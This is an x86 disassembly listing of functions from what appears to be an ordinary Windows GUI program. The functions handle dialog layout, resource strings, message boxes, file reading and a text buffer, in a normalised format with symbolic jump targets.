add edx ebp
push edx
sub eax [ esi + 0xc ]
add eax ecx
push eax
push 0x4
call ebx
mov ebp [ esp + 0x20 ]
sub ebp [ edi + 0x4 ]
push 0x21
sub ebp eax
call ebx
sub ebp eax
push ebp
push 0x20
call ebx
mov edx [ edi ]
mov ecx [ esp + 0x20 ]
sub ecx edx
mov edx [ esi + 0x20 ]
sub ecx eax
push ecx
push edx
call [ MoveWindow@IAT ]
mov al [ esi + 0x4 ]
test al al
je r-xdata
lea edi [ esp + 0x20 ]
pop edi
pop ebp
pop ebx
mov eax [ esi + 0x24 ]
push 0x1
push eax
call [ GetDlgItem@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
push eax
mov [ esp + 0x3c ] eax
call [ GetWindowRect@IAT ]
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x10 ]
sub edx eax
mov eax [ esp + 0x18 ]
push 0x1
push edx
sub eax ecx
push eax
push 0x4
call ebx
mov ebp [ esi + 0x1c ]
mov ecx [ edi + 0x4 ]
mov edx [ esi + 0x10 ]
sub ebp ecx
sub ebp edx
push 0x21
sub ebp eax
call ebx
mov ecx [ edi + 0xc ]
sub ebp eax
add ebp ecx
push ebp
push 0x20
call ebx
mov edx [ edi ]
mov ecx [ esp + 0x20 ]
sub ecx edx
mov edx [ esp + 0x44 ]
sub ecx eax
push ecx
push edx
call [ MoveWindow@IAT ]
mov eax [ esi + 0x24 ]
push 0x2
push eax
call [ GetDlgItem@IAT ]
lea ecx [ esp + 0x10 ]
mov ebp eax
push ecx
push ebp
call [ GetWindowRect@IAT ]
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
push 0x1
sub edx ecx
push edx
sub eax [ esp + 0x18 ]
push eax
push 0x4
call ebx
mov edx [ edi + 0x4 ]
mov ecx [ esi + 0x1c ]
sub ecx edx
sub ecx [ esi + 0x10 ]
sub ecx eax
push 0x21
mov [ esp + 0x44 ] ecx
call ebx
mov ecx [ esp + 0x40 ]
mov esi [ edi + 0xc ]
sub ecx eax
add ecx esi
push ecx
push 0x20
call ebx
mov ecx [ esp + 0x20 ]
sub ecx [ edi ]
sub ecx eax
push ecx
push ebp
call [ MoveWindow@IAT ]
sub_4209c0
mov eax [ esp + 0x4 ]
mov edx [ eax ]
push esi
mov esi [ ecx + 0xc ]
push edi
mov edi [ eax + 0x8 ]
sub edi edx
cmp edi esi
jge r-xdata
mov edx [ eax + 0x4 ]
mov esi [ eax + 0xc ]
mov ecx [ ecx + 0x10 ]
sub esi edx
pop edi
cmp esi ecx
pop esi
jge r-xdata
add esi edx
mov [ eax + 0x8 ] esi
retn 0x4
add ecx edx
mov [ eax + 0xc ] ecx
sub_420a00
push edi
mov edi [ esp + 0xc ]
cmp [ edi ] 0x0
jne r-xdata
push ebx
mov ebx [ lstrlenA@IAT ]
push ebp
push esi
mov esi [ esp + 0x14 ]
push esi
call ebx
cmp [ eax + esi - 0x1 ] 0x5c
mov ebp [ lstrcatA@IAT ]
je r-xdata
mov eax edi
pop edi
retn
push edi
push esi
call ebp
push edi
call ebx
pop esi
pop ebp
pop ebx
lea eax [ eax + edi + 0x1 ]
pop edi
retn
push r--data
push esi
call ebp
sub_420a50
mov eax [ esp + 0x8 ]
sub eax 0x53
je r-xdata
mov eax [ rw-data ]
mov ecx [ esp + 0x4 ]
push eax
push ecx
call sub_414bc0
add esp 0x8
sub eax 0xbd
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov eax 0x1
retn 0x10
mov edx [ esp + 0x4 ]
push eax
push 0x898
push edx
call [ SetDlgItemTextA@IAT ]
mov eax 0x1
retn 0x10
movzx eax [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
push eax
push ecx
call [ EndDialog@IAT ]
mov eax 0x1
retn 0x10
xor eax eax
retn 0x10
sub_420ac0
push ebx
push esi
push edi
mov edi [ SetErrorMode@IAT ]
push 0x1
call edi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
mov ebx eax
mov eax [ esp + 0x24 ]
push 0x80000000
push eax
call [ CreateFileA@IAT ]
push ebx
mov esi eax
call edi
cmp esi 0xffffffff
jne r-xdata
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
retn
pop edi
pop esi
xor eax eax
pop ebx
retn
sub_420b10
mov ecx [ esp + 0x8 ]
mov edx [ rw-data ]
sub esp 0x200
push esi
push 0x200
lea eax [ esp + 0x8 ]
push eax
push ecx
push edx
call [ LoadStringA@IAT ]
mov esi [ esp + 0x208 ]
lea eax [ esp + 0x210 ]
push eax
lea ecx [ esp + 0x8 ]
push ecx
push esi
call [ wvsprintfA@IAT ]
mov eax esi
pop esi
add esp 0x200
retn
sub_420b60
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
sub esp 0x204
push 0x200
lea eax [ esp + 0x8 ]
push eax
push ecx
push edx
call [ GetDlgItemTextA@IAT ]
lea eax [ esp ]
push eax
lea ecx [ esp + 0x8 ]
push r--data
push ecx
call sub_42a0fd
add esp 0xc
cmp eax 0x1
je r-xdata
fld [ esp ]
fcom [ esp + 0x210 ]
fnstsw ax
test ah 0x5
jpe r-xdata
fld [ esp + 0x218 ]
jmp r-xdata
fcom [ esp + 0x214 ]
fnstsw ax
test ah 0x41
jne r-xdata
fstp st0
fld [ esp + 0x210 ]
mov eax [ esp + 0x220 ]
test eax eax
je r-xdata
fimul [ esp + 0x21c ]
fstp st0
fld [ esp + 0x214 ]
fadd [ r--data ]
add esp 0x204
jmp sub_42a134
fst [ eax ]
sub_420c00
sub esp 0x8
push esi
lea eax [ esp + 0x8 ]
xor esi esi
push eax
mov [ esp + 0x8 ] esi
mov [ esp + 0xc ] esi
call [ SHGetMalloc@IAT ]
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x4 ]
push ecx
push edx
push esi
call [ SHGetSpecialFolderLocation@IAT ]
mov esi [ esp + 0x14 ]
mov eax [ esp + 0x4 ]
push esi
push eax
call [ SHGetPathFromIDListA@IAT ]
mov edx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
push edx
push eax
call [ ecx + 0x14 ]
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax esi
pop esi
add esp 0x8
retn
sub_420c60
push ecx
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push 0x1
lea eax [ esp + 0x4 ]
push eax
push ecx
push edx
call [ GetDlgItemInt@IAT ]
mov ecx [ esp ]
test ecx ecx
jne r-xdata
mov ecx [ esp + 0x10 ]
cmp eax ecx
jge r-xdata
mov eax [ esp + 0x18 ]
pop ecx
retn
mov ecx [ esp + 0x14 ]
cmp eax ecx
jle r-xdata
mov eax ecx
pop ecx
retn
mov eax ecx
sub_420cd0
movzx eax [ esp + 0x4 ]
mov ecx [ rw-data ]
push 0x5
push eax
push ecx
call [ FindResourceA@IAT ]
mov edx [ rw-data ]
push eax
push edx
call [ LoadResource@IAT ]
push eax
call [ LockResource@IAT ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push ecx
mov ecx [ esp + 0xc ]
push edx
mov edx [ rw-data ]
push ecx
push eax
push edx
call [ CreateDialogIndirectParamA@IAT ]
retn
sub_420d20
movzx eax [ esp + 0x4 ]
mov ecx [ rw-data ]
push 0x5
push eax
push ecx
call [ FindResourceA@IAT ]
mov edx [ rw-data ]
push eax
push edx
call [ LoadResource@IAT ]
push eax
call [ LockResource@IAT ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push ecx
mov ecx [ esp + 0xc ]
push edx
mov edx [ rw-data ]
push ecx
push eax
push edx
call [ DialogBoxIndirectParamA@IAT ]
retn
sub_420d70
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
je r-xdata
pop edi
xor eax eax
pop esi
retn
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
lea edi [ eax + eax ]
push edi
call sub_429a56
add esp 0x4
test eax eax
je r-xdata
mov ecx edi
mov edx ecx
shr ecx 0x2
mov edi eax
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_420db0
push ecx
mov eax [ esp + 0x8 ]
push esi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push eax
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push ebx
push edi
push 0x0
push esi
call [ GetFileSize@IAT ]
mov ebx eax
lea ecx [ ebx + 0x6 ]
push ecx
push 0x1
call sub_429969
mov edi eax
add esp 0x8
test edi edi
je r-xdata
xor eax eax
pop esi
pop ecx
retn
push esi
call [ CloseHandle@IAT ]
mov eax edi
pop edi
pop ebx
pop esi
pop ecx
retn
push 0x0
lea edx [ esp + 0x10 ]
push edx
push ebx
push edi
push esi
call [ ReadFile@IAT ]
sub_420e20
mov ecx [ esp + 0x8 ]
mov edx [ rw-data ]
sub esp 0x500
push esi
mov esi [ LoadStringA@IAT ]
push 0x200
lea eax [ esp + 0x108 ]
push eax
push ecx
push edx
call esi
lea eax [ esp + 0x518 ]
push eax
lea ecx [ esp + 0x108 ]
push ecx
lea edx [ esp + 0x30c ]
push edx
call [ wvsprintfA@IAT ]
mov ecx [ esp + 0x510 ]
mov edx [ rw-data ]
push 0x100
lea eax [ esp + 0x8 ]
push eax
push ecx
push edx
call esi
mov eax [ esp + 0x514 ]
push eax
mov eax [ esp + 0x50c ]
lea ecx [ esp + 0x8 ]
push ecx
lea edx [ esp + 0x30c ]
push edx
push eax
call [ MessageBoxA@IAT ]
pop esi
add esp 0x500
retn
sub_420eb0
fild [ esp + 0x10 ]
sub esp 0x64
sub esp 0x8
lea eax [ esp + 0x8 ]
fdivr [ esp + 0x78 ]
fstp [ esp ]
push r--data
push eax
call sub_42a060
mov edx [ esp + 0x7c ]
mov eax [ esp + 0x78 ]
add esp 0x10
lea ecx [ esp ]
push ecx
push edx
push eax
call [ SetDlgItemTextA@IAT ]
add esp 0x64
retn
sub_420f10
mov eax [ esp + 0x4 ]
push ebx
push esi
push eax
call sub_420ca0
mov ebx [ esp + 0x14 ]
add esp 0x4
test ebx ebx
mov esi eax
je r-xdata
cmp [ esi ] 0x0
mov eax esi
je r-xdata
push edi
mov edi [ lstrlenA@IAT ]
push esi
call edi
mov ecx 0x200
sub ecx eax
push ecx
push esi
call edi
mov edx [ rw-data ]
add eax esi
push eax
push ebx
push edx
call [ LoadStringA@IAT ]
pop edi
mov eax esi
pop esi
pop ebx
retn
cmp [ eax ] 0x9
jne r-xdata
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov [ eax ] 0x0
sub_420f70
mov ecx [ esp + 0x4 ]
mov edx [ rw-data ]
sub esp 0x200
push 0x100
lea eax [ esp + 0x4 ]
push eax
push ecx
push edx
call [ LoadStringA@IAT ]
lea eax [ esp + 0x208 ]
push eax
lea ecx [ esp + 0x4 ]
push ecx
lea edx [ esp + 0x108 ]
push edx
call [ wvsprintfA@IAT ]
push 0x24
push 0x3
call sub_420ca0
mov ecx [ rw-data ]
add esp 0x4
push eax
lea eax [ esp + 0x108 ]
push eax
push ecx
call [ MessageBoxA@IAT ]
sub eax 0x6
neg eax
sbb eax eax
inc eax
add esp 0x200
retn
sub_420fe0
sub esp 0x30
mov eax [ esp + 0x40 ]
mov edx [ esp + 0x3c ]
lea ecx [ esp ]
push ecx
mov ecx [ esp + 0x38 ]
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x3c ]
push edx
push eax
push ecx
mov [ esp + 0x10 ] 0x30
mov [ esp + 0x14 ] 0x12
mov [ esp + 0x38 ] 0x200
call [ GetMenuItemInfoA@IAT ]
mov ecx [ esp + 0x10 ]
neg eax
sbb eax eax
and eax ecx
add esp 0x30
retn
sub_421030
push ebx
mov ebx [ esp + 0x8 ]
mov edx ecx
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
lea ecx [ esi + esi ]
mov ebp ecx
shr ecx 0x2
xor eax eax
mov edi ebx
[ edi ]
mov ecx ebp
and ecx 0x3
[ edi ]
mov ecx edx
call sub_420490
cmp eax esi
jl r-xdata
mov esi [ edx ]
lea ecx [ eax + eax ]
mov eax ecx
shr ecx 0x2
mov edi ebx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
lea eax [ esi - 0x1 ]
sub_421080
mov edx [ esp + 0x4 ]
push esi
push edi
lea eax [ esp + 0x10 ]
push eax
push 0x0
mov esi ecx
mov ecx [ esp + 0x18 ]
push 0x409
push ecx
push edx
call [ SendDlgItemMessageA@IAT ]
mov ecx esi
mov edi eax
call sub_420470
test edi edi
je r-xdata
pop edi
pop esi
retn 0x8
mov eax [ esp + 0x10 ]
push edi
push eax
mov ecx esi
call sub_420550
sub_4210c0
sub esp 0x3c
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x50 ]
mov ebp 0x8
push ebp
push edi
call [ GetWindowLongA@IAT ]
mov ecx [ esp + 0x54 ]
mov edx [ esp + 0x5c ]
mov esi [ esp + 0x58 ]
mov ebx eax
lea eax [ ecx - 0x4e ]
cmp eax 0xc3
ja r-xdata
test ebx ebx
je r-xdata
movzx eax [ eax + lookup_table_42142c ]
jmp [ eax * 4 + jump_table_421418 ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x3c
retn 0x10
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
push 0x6a4
push edi
call [ GetDlgItem@IAT ]
mov esi [ esp + 0x5c ]
push esi
push ebp
push edi
mov ebx eax
mov [ esp + 0x64 ] esi
call [ SetWindowLongA@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
push edi
call [ GetWindowRect@IAT ]
mov edi [ GetSystemMetrics@IAT ]
push ebp
call edi
push 0x4
mov ebp eax
call edi
add eax [ esp + 0x14 ]
add eax ebp
push 0x8
mov [ esp + 0x18 ] eax
call edi
push 0x4
mov ebp eax
call edi
add eax [ esp + 0x1c ]
add eax ebp
mov [ esp + 0x1c ] eax
xor eax eax
mov ecx 0x7
lea edi [ esp + 0x30 ]
xor ebp ebp
cmp [ esi + 0x4 ] bp
[ edi ]
mov [ esp + 0x30 ] 0x9
jle r-xdata
mov eax [ edx + 0x8 ]
cmp eax 0x2
je r-xdata
movzx eax si
dec eax
je r-xdata
movsx edx [ ebx + 0x6 ]
mov eax [ ebx ]
shl edx 0x4
movzx ecx [ edx + eax + 0xc ]
push ecx
push edi
call sub_414bc0
add esp 0x8
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x3c
retn 0x10
push edx
push esi
push ecx
push edi
call ebx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x3c
retn 0x10
movsx ecx [ esi + 0x6 ]
mov ebp [ SendMessageA@IAT ]
push 0x0
push ecx
push 0x130c
push ebx
call ebp
mov edi [ esp + 0x50 ]
mov ebx [ esp + 0x58 ]
jmp r-xdata
mov [ esp + 0x5c ] ebp
nop
push 0x0
push edi
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x3c
retn 0x10
cmp eax 0xfffffdd8
je r-xdata
push 0x6a4
push edi
call [ GetDlgItem@IAT ]
xor esi esi
mov [ esp + 0x30 ] ebp
cmp [ ebx + 0x4 ] si
mov [ esp + 0x50 ] eax
jle r-xdata
dec eax
je r-xdata
push 0x6a4
push edi
call [ GetDlgItem@IAT ]
push 0x0
push 0x0
mov esi eax
push 0x130b
push esi
mov [ esp + 0x40 ] 0x8
call ebp
lea edx [ esp + 0x30 ]
push edx
push eax
push 0x1305
push esi
mov [ ebx + 0x6 ] ax
call ebp
mov esi [ esp + 0x48 ]
push 0x5
push esi
call [ ShowWindow@IAT ]
push esi
call [ BringWindowToTop@IAT ]
cmp [ esp + 0x54 ] 0x110
jne r-xdata
mov edx [ esi ]
mov eax [ esp + 0x5c ]
mov ecx [ eax + edx + 0x8 ]
add eax edx
mov edx [ esp + 0x50 ]
mov eax [ eax + 0x4 ]
push 0x0
push ecx
push edx
push eax
call sub_420cd0
mov ecx [ esi ]
mov edx [ esp + 0x6c ]
mov edi eax
movsx eax [ edx + ecx ]
push eax
call sub_420ca0
add esp 0x14
lea ecx [ esp + 0x30 ]
push ecx
push ebp
push 0x1307
push ebx
mov [ esp + 0x4c ] eax
mov [ esp + 0x58 ] edi
call [ SendMessageA@IAT ]
lea edx [ esp + 0x20 ]
push edx
push ebx
call [ GetWindowRect@IAT ]
lea eax [ esp + 0x20 ]
push eax
push 0x0
push 0x1328
push ebx
call [ SendMessageA@IAT ]
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x28 ]
push 0x1
sub ecx eax
push ecx
mov ecx [ esp + 0x28 ]
sub edx ecx
push edx
sub eax [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
push eax
sub ecx edx
push ecx
push edi
call [ MoveWindow@IAT ]
push 0x0
push edi
call [ ShowWindow@IAT ]
mov edx [ esp + 0x5c ]
movsx eax [ esi + 0x4 ]
inc ebp
add edx 0x10
cmp ebp eax
mov [ esp + 0x5c ] edx
jl r-xdata
push 0x6a4
push edi
call [ GetDlgItem@IAT ]
mov edi [ SendMessageA@IAT ]
mov esi eax
lea eax [ esp + 0x30 ]
push eax
push 0x0
push 0x0
push 0x130b
push esi
mov [ esp + 0x44 ] ebp
call edi
push eax
push 0x1305
push esi
call edi
mov ecx [ esp + 0x48 ]
push 0x0
push ecx
call [ ShowWindow@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x3c
retn 0x10
cmp eax 0xfffffdd9
jne r-xdata
push 0x1
push edi
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x3c
retn 0x10
mov ebp [ SendMessageA@IAT ]
mov edi edi
sub eax 0x6a3
jne r-xdata
push 0x0
push 0x0
push esi
call [ GetNextDlgTabItem@IAT ]
push eax
call [ SetFocus@IAT ]
mov ebp [ SendMessageA@IAT ]
mov eax [ esp + 0x50 ]
lea edx [ esp + 0x30 ]
push edx
push esi
push 0x1305
push eax
call ebp
mov ecx [ esp + 0x48 ]
push 0x0
push 0x0
push 0x401
push ecx
call ebp
movsx edx [ ebx + 0x4 ]
inc esi
cmp esi edx
jl r-xdata
sub_4214f0
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x10 ]
push 0x0
push sub_420a50
push eax
mov eax [ esp + 0x14 ]
push eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
call sub_420d20
add esp 0x10
retn
mov eax [ rw-data ]
sub_421530
mov ecx [ esp + 0x8 ]
mov edx [ rw-data ]
sub esp 0x400
push 0x200
lea eax [ esp + 0x204 ]
push eax
push ecx
push edx
call [ LoadStringA@IAT ]
lea eax [ esp + 0x40c ]
push eax
lea ecx [ esp + 0x204 ]
push ecx
lea edx [ esp + 0x8 ]
push edx
call [ wvsprintfA@IAT ]
mov eax [ esp + 0x404 ]
test eax eax
je r-xdata
push 0x40
push 0x4
call sub_420ca0
add esp 0x4
push eax
mov eax [ rw-data ]
lea edx [ esp + 0x8 ]
push edx
push eax
call [ MessageBoxA@IAT ]
add esp 0x400
retn
push 0x30
push 0x6
call sub_420ca0
mov ecx [ rw-data ]
add esp 0x4
push eax
lea eax [ esp + 0x8 ]
push eax
push ecx
call [ MessageBoxA@IAT ]
add esp 0x400
retn
sub_4215f0
cmp [ edx ] 0x0
jne r-xdata
mov ecx eax
sar eax 0x8
and ecx 0xff
cmp eax 0x21
je r-xdata
xor eax eax
retn
mov al [ rw-data ]
test al al
je r-xdata
cmp eax 0x23
jle r-xdata
mov ecx [ edx ]
xor eax eax
test ecx ecx
sete al
retn
lea eax [ ecx - 0x22 ]
cmp eax 0x37
ja r-xdata
cmp eax 0x25
jg r-xdata
movzx ecx [ eax + lookup_table_4216b8 ]
jmp [ ecx * 4 + jump_table_4216b0 ]
mov al [ rw-data ]
test al al
je r-xdata
mov [ edx ] 0x0
lea eax [ ecx - 0x21 ]
cmp eax 0x46
ja r-xdata
movzx eax [ eax + lookup_table_421668 ]
jmp [ eax * 4 + jump_table_421660 ]
sub_4216f0
push esi
mov esi ecx
push edi
xor eax eax
mov ecx 0x9
mov edi esi
push 0x10
[ edi ]
call sub_42991a
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
xor ecx ecx
mov [ eax ] ecx
mov eax [ esi + 0x8 ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x8 ]
mov [ edx + 0xc ] ecx
mov eax [ esi + 0x8 ]
add esp 0x4
mov [ eax + 0x8 ] ecx
pop edi
mov [ esi + 0x1c ] 0x64
mov eax esi
pop esi
retn
sub_421730
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov esi [ esi + 0x10 ]
test esi esi
je r-xdata
lea ebx [ ebx ]
pop esi
retn
push esi
call sub_429931
add esp 0x4
mov ecx [ eax + 0x8 ]
push eax
mov [ esi + 0x8 ] ecx
call j_sub_429931
mov eax [ esi + 0x8 ]
add esp 0x4
test eax eax
jne r-xdata
sub_421770
movsx eax [ rw-data ]
push ebx
push ebp
mov ebx ecx
push edi
add eax [ ebx + 0x14 ]
shl eax 0x1
push eax
call sub_429a56
mov ebp eax
add esp 0x4
test ebp ebp
jne r-xdata
push esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
mov ecx [ rw-data ]
push ecx
call sub_420ef0
add esp 0x4
pop edi
pop ebp
mov eax 0x1
pop ebx
retn
mov eax [ ebx + 0x14 ]
mov [ ebx + 0x10 ] ebp
movsx ecx [ rw-data ]
pop esi
pop edi
add eax ecx
mov [ ebx + 0x14 ] eax
pop ebp
xor eax eax
pop ebx
retn
mov ecx [ ebx + 0x14 ]
shl ecx 0x1
mov edx ecx
shr ecx 0x2
mov edi ebp
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x10 ]
push eax
call sub_429931
add esp 0x4
sub_421820
movsx edx [ rw-data ]
movzx eax [ ecx + 0x1f ]
imul eax edx
push esi
movsx esi [ rw-data ]
push edi
mov edi [ esp + 0xc ]
add eax esi
mov esi [ ecx + 0x8 ]
cmp esi edi
pop edi
pop esi
jne r-xdata
retn 0x4
movsx ecx [ ecx + 0x21 ]
imul ecx edx
add eax ecx
sub_421860
push esi
push 0x10
mov esi ecx
call sub_42991a
xor ecx ecx
add esp 0x4
cmp eax ecx
jne r-xdata
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ esi + 0xc ]
mov [ eax + 0xc ] ecx
mov edx [ esi + 0xc ]
mov [ edx + 0x8 ] eax
mov [ esi + 0xc ] eax
pop esi
retn
xor eax eax
pop esi
retn
sub_421890
push ebx
mov ebx ecx
mov eax [ ebx + 0x14 ]
push ebp
mov ebp [ esp + 0x10 ]
cmp eax ebp
jg r-xdata
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi [ ebx + 0x10 ]
lea ecx [ ebp + ebp ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
mov [ ebx + 0x18 ] ebp
pop ebp
xor eax eax
pop ebx
retn 0x8
nop
pop ebp
mov eax 0x1
pop ebx
retn 0x8
cmp [ ebx + 0x14 ] ebp
jle r-xdata
mov ecx ebx
call sub_421770
test eax eax
jne r-xdata
sub_4218f0
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
push 0x0
push esi
mov edi ecx
call sub_40e1b0
push esi
mov ecx edi
call sub_4250f0
mov eax [ edi + 0x68 ]
cmp eax esi
lea ebx [ edi + 0x68 ]
jne r-xdata
cmp [ edi + 0x4c ] esi
jne r-xdata
mov ecx ebx
call sub_40dad0
cmp [ ebx ] esi
je r-xdata
cmp [ edi + 0x50 ] esi
jne r-xdata
mov eax [ esi ]
mov [ edi + 0x4c ] eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
mov [ edi + 0x50 ] ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov edx [ esi ]
mov [ eax ] edx
cmp [ edi + 0x54 ] esi
jne r-xdata
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx edi
call sub_40ea70
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi ]
test eax eax
je r-xdata
mov edx [ esi + 0x4 ]
mov [ edi + 0x54 ] edx
mov [ edi + 0x54 ] eax
jmp r-xdata
mov eax [ edi + 0x54 ]
mov ecx [ eax + 0x8 ]
mov [ edi + 0x58 ] ecx
mov [ edi + 0x5c ] 0x0
sub_421980
push 0xffffffff
push sub_431dab
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push edi
push 0x24
mov edi ecx
call sub_42991a
add esp 0x4
mov [ esp + 0x8 ] eax
test eax eax
mov [ esp + 0x14 ] 0x0
je r-xdata
xor esi esi
mov ecx eax
call sub_4216f0
mov esi eax
jmp r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
pop edi
mov eax 0x1
pop esi
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
test esi esi
mov [ esp + 0x14 ] 0xffffffff
jne r-xdata
mov [ edi + 0x50 ] esi
mov [ edi + 0x4c ] esi
mov [ esi + 0x4 ] eax
mov ecx [ eax ]
mov [ esi ] ecx
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov [ eax ] esi
cmp eax [ edi + 0x50 ]
jne r-xdata
mov [ ecx + 0x4 ] esi
push eax
mov ecx esi
call sub_4217f0
mov [ esi + 0x1e ] 0x0
jmp r-xdata
mov [ edi + 0x50 ] esi
push esi
mov ecx edi
call sub_424bd0
mov ecx edi
call sub_40ea70
push 0x0
push esi
mov ecx edi
call sub_40e1b0
mov ecx [ esp + 0xc ]
pop edi
xor eax eax
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_421a50
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
push 0x30
mov edi ecx
call sub_424dd0
mov al [ esp + 0x10 ]
push 0x0
push esi
mov ecx edi
mov [ esi + 0x1e ] al
mov [ esi + 0x18 ] 0x0
call sub_40e240
pop edi
pop esi
retn 0x8
sub_421a80
push esi
mov esi ecx
mov eax [ esi + 0x18 ]
mov ecx [ esi + 0x14 ]
inc eax
cmp eax ecx
jle r-xdata
mov ecx [ esi + 0x18 ]
mov ax [ esp + 0x8 ]
mov edx [ esi + 0x10 ]
mov [ edx + ecx * 2 ] ax
inc [ esi + 0x18 ]
mov ecx esi
call sub_421770
test eax eax
jne r-xdata
pop esi
retn 0x4
sub_421ad0
sub esp 0x20
push ebx
push ebp
mov ebp [ esp + 0x2c ]
push esi
movsx esi [ ebp + 0x7e ]
movsx eax [ rw-data ]
push edi
mov edi ecx
movsx edx [ edi + 0x21 ]
sub esi edx
movzx edx [ edi + 0x1f ]
mov ebx [ edi + 0x8 ]
sub esi edx
movzx edx [ edi + 0x20 ]
sub esi edx
movsx edx [ rw-data ]
imul esi edx
xor ecx ecx
add esi eax
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x38 ]
cmp eax ecx
mov [ esp + 0x20 ] ecx
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x28 ] ecx
mov [ esp + 0x2c ] 0x1
mov [ ebx ] ecx
je r-xdata
mov edx [ edi + 0x18 ]
xor eax eax
cmp edx ecx
mov [ esp + 0x10 ] eax
jle r-xdata
mov eax [ eax + 0xc ]
mov [ esp + 0x38 ] eax
sub eax [ ebx ]
mov [ ebx + 0x4 ] eax
mov eax [ ebp + 0x58 ]
mov dx [ eax ]
add [ ebp + 0x5c ] dx
mov eax [ ebp + 0x54 ]
mov edx [ eax + 0x8 ]
lea esi [ ebp + 0x54 ]
mov [ esi + 0x4 ] edx
cmp [ ebx + 0x8 ] ecx
je r-xdata
lea esp [ esp ]
mov ecx esi
call sub_40db00
mov eax [ esp + 0x3c ]
test eax eax
mov [ edi + 0xc ] ebx
je r-xdata
mov [ esp + 0x28 ] 0x1
test ebp 0x7f00
jne r-xdata
cmp bp 0x20
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn 0xc
mov eax [ esp + 0x28 ]
test eax eax
mov ecx ebp
je r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ eax + 0x8 ]
push eax
mov [ ebx + 0x8 ] ecx
call j_sub_429931
mov eax [ ebx + 0x8 ]
add esp 0x4
test eax eax
jne r-xdata
mov [ ebp + 0x6c ] ebx
mov edx [ esp + 0x10 ]
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x18 ] eax
cmp bp 0x20
je r-xdata
cmp bp 0x9
je r-xdata
mov eax [ esp + 0x38 ]
push eax
push edi
call sub_40e240
mov edx [ esp + 0x38 ]
push edx
push edi
call sub_40e1b0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn 0xc
mov eax [ ebp + 0x6c ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov ecx [ edi + 0x10 ]
mov bp [ ecx + eax * 2 ]
mov edx [ esp + 0x24 ]
movzx eax bp
push eax
push edx
mov ecx rw-data
call sub_4138a0
cmp eax esi
mov [ esp + 0x14 ] eax
jle r-xdata
mov ebp [ esp + 0x34 ]
xor ecx ecx
cmp bp 0x9
je r-xdata
